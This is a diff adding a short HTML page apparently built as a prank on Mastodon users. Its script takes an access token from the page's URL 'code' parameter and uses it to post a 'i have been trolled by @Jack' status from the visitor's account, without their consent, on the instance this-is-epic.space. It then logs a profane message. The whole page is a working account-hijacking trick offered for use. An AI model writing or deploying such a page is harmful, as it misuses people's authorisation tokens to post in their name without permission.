@@ -1,0 +1,24 @@
+<!doctype html>
+<h1>bruh</h1>
+<title>trolled</title>
+<p>check your toots</p>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script src="mastodon.js"></script>
+<script>
+    // initialize library
+    // api_user_token has not to be set at this point if you don't have one yet
+    // NOTE: It needs jQuery!
+    var api = new MastodonAPI({
+        instance: "https://this-is-epic.space",
+        api_user_token: new URLSearchParams(location.search).get('code')
+    });
+
+    //
+    // BASIC REST FUNCTIONS
+    // you can use every api endpoint from https://github.com/tootsuite/documentation/blob/master/Using-the-API/API.md
+    //
+
+    api.post("statuses", {status:"i have been trolled by @Jack@this-is-epic.space"}, function (data) {
+      console.log('done fuck you')
+    });
+    </script>
